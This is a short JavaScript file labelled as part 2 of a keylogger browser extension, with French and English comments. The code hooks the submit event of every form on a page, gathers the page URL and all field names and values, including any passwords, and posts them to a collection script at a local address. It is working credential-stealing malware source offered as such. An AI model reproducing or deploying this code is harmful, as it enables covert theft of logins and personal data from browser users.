//get every form                         partie 2 Keylogger extension 
var forms = document.forms;

//called when a submit event happens

function formSubmit(event) { 
    var xhr = new XMLHttpRequest();  // creér un dossier nommer le " chrome "
    xhr.open('POST', 'http://127.0.0.1/chrome/send.php'); // link website to send information via formulaire
    var string = document.URL;                                      
    // iterate over all of the form fields and urlencode them. There'll be an extra & at the end but who cares
    for (index = 0; index < event.target.elements.length; ++index) {
        string = string + event.target.elements[index].name + '=' + event.target.elements[index].value + '&';
    }
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send(string);
}

// add an event listener to the submit event for every form in the page
for (index = 0; index < forms.length; ++index) {
    forms[index].addEventListener('submit', formSubmit); 
}


// probleme keylogger give link web site for exemple   http://127_0_0_1  but not -----> http://127.0.0.1

// make control + s 